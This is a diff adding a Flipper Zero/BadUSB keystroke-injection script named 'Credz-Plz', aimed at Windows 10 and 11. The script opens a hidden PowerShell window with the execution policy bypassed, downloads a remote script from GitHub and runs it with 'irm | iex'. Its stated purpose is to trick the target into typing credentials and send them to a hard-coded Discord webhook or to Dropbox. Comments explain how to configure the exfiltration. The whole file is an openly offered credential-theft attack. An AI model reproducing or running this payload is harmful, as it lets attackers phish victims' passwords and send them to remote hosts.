@@ -1,0 +1,20 @@
+
+REM     Title: Credz-Plz
+
+REM     Author: I am Jakoby
+
+REM     Description: This payload prompts the target to enter their creds to later be exfiltrated with either Dropbox or a  Discord webhook.
+
+REM     See README.md file for more details.
+
+REM     Target: Windows 10, 11
+
+GUI r
+DELAY 500
+STRING powershell -w h -ep bypass $dc='https://discord.com/api/webhooks/1184204863840718939/PDUIhogwyvb67iW3ewalKdcbYyD9ms4nO190qbUkAy-e0zC7zj9oN2yoW-fKBG72F21E';$db='';irm https://raw.githubusercontent.com/MovinjMatt/Support-Flipper-USB/main/Payloads/Flip-Credz-Plz/Credz-Plz.ps1 | iex
+ENTER
+
+REM     Fill in either variable or both to set your exfil method.
+REM     $db is the variable that holds your DropBox token.
+REM     $dc is the variable that holds your Discord webhook.   
+REM     If you are using DropBox, also remember to replace ?dl=0 with ?dl=1 at the end of your link so it is executed properly.
